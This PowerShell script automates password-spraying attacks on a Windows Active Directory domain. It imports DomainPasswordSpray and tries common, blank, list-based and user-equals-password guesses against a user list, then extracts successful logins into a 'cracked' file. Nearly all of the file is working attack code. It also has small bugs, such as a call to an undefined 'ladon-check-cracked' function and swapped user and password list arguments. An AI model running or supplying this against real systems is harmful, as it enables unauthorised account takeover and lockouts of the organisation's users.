
   
# Input Switches
[CmdletBinding()]
Param(
    [Parameter(Mandatory = $false,
    HelpMessage = 'Users list')]
    [string]$UserList,

    [Parameter(Mandatory = $false,
    HelpMessage = 'Enter Domain')]
    [string]$Domain,
    
    [Parameter(Mandatory = $true,
    HelpMessage = 'Target IP')]
    [string]$Target,
    
    [Parameter(Mandatory = $false,
    HelpMessage = 'Custom Password list')]
    [string]$PassList     
)

# these are the variables to use in the script
$global:domain2=$Domain
$global:target2=$Target
$global:userlist2=$UserList
$global:passlist=$PassList

if (!$domain2) { 
# if no domain is given then set it to a '.' 
$global:domain2="."
}

if (!$userlist2) { 
$global:userlist2="users.txt"
}


function debug {
echo "target: $target"
echo "userlist: $userlist2"
echo "domain: $domain2"
echo "passlist: $passlist2"
}  



date 
####################################
# Ladon
####################################
function dps-check-cracked {
Get-Content .\domainpassspray_brute.log| findstr "SUCCESS" | sort-object| Get-Unique > domainpassspray_brute_cracked.txt
cat domainpassspray_brute_cracked.txt

}

function dps-password {
Write-Output ""
Write-Output "[+] password"
Write-Output ""
Invoke-DomainPasswordSpray -Domain $domain2 -UserList $userlist2 -Password password -Force -OutFile domainpassspray_brute.log 2>$nul
Write-Output ""
dps-check-cracked
}
function dps-pass5 {
Write-Output ""
Write-Output "[+] pass5.txt"
Write-Output ""
Invoke-DomainPasswordSpray -Domain $domain2 -Force -UserList $userlist2 -PasswordList pass5.txt -OutFile domainpassspray_brute.log 2>$nul
Write-Output ""
dps-check-cracked
}
function dps-userpass {
Write-Output ""
Write-Output "[+] user = pass"
Write-Output ""
Invoke-DomainPasswordSpray -Domain $domain2 -Force -UserList $userlist2 -PasswordList $userlist2 -OutFile domainpassspray_brute.log 2>$nul
Write-Output ""
ladon-check-cracked
}
function dps-blank {
Write-Output ""
Write-Output "[+] pass_blank.txt"
Write-Output ""
Invoke-DomainPasswordSpray -Domain $domain2 -Force -UserList $userlist2 -PasswordList pass_blank.txt -OutFile domainpassspray_brute.log 2>$nul
Write-Output ""
dps-check-cracked
}
function dps-pass10 {
Write-Output ""
Write-Output "[+] pass10.txt"
Write-Output ""
Invoke-DomainPasswordSpray -Domain $domain2 -Force -UserList pass10.txt -PasswordList pass5.txt -OutFile domainpassspray_brute.log 2>$nul 	
Write-Output ""
dps-check-cracked
}
function dps-pass100 {
Write-Output ""
Write-Output "[+] pass100.txt"
Write-Output ""
Invoke-DomainPasswordSpray -Domain $domain2 -Force -UserList pass100.txt -PasswordList pass5.txt -OutFile domainpassspray_brute.log 2>$nul
Write-Output ""
dps-check-cracked
}

Import-Module .\DomainPasswordSpray.ps1

echo "" > .\domainpassspray_brute.log

Import-Module .\DomainPasswordSpray.ps1

debug
dps-password
#dps-pass5
#dps-userpass
#dps-blank
#dps-pass10
#dps-pass100